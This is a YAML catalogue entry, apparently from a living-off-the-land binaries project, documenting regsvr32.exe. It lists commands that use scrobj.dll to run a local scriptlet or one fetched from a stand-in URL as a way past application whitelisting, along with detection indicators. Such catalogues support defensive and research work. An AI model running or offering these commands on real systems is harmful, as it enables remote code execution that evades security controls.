---
name: Regsvr32.exe
description: Used by Windows to register dlls
functions:
  execute:
    - description: Execute the specified remote .SCT script with scrobj.dll.
      code: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
      mitreid: T1117
      mitrelink: https://attack.mitre.org/wiki/Technique/T1117
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code from remote scriptlet, bypass Application whitelisting
    - description: Execute the specified local .SCT script with scrobj.dll.
      code: regsvr32.exe /s /u /i:file.sct scrobj.dll
      mitreid: T1117
      mitrelink: https://attack.mitre.org/wiki/Technique/T1117
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code from scriptlet, bypass Application whitelisting
  awl bypass:
    - description: Execute the specified remote .SCT script with scrobj.dll.
      code: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
      mitreid: T1117
      mitrelink: https://attack.mitre.org/wiki/Technique/T1117
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code from remote scriptlet, bypass Application whitelisting
    - description: Execute the specified local .SCT script with scrobj.dll.
      code: regsvr32.exe /s /u /i:file.sct scrobj.dll
      mitreid: T1117
      mitrelink: https://attack.mitre.org/wiki/Technique/T1117
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code from scriptlet, bypass Application whitelisting
resources:
    - resource: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
    - resource: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
    - resource: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md
fullpath:
    - path: C:\Windows\System32\regsvr32.exe
    - path: C:\Windows\SysWOW64\regsvr32.exe
detection:
  - IOC: regsvr32.exe getting files from Internet
  - IOC: regsvr32.exe executing scriptlet files
acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
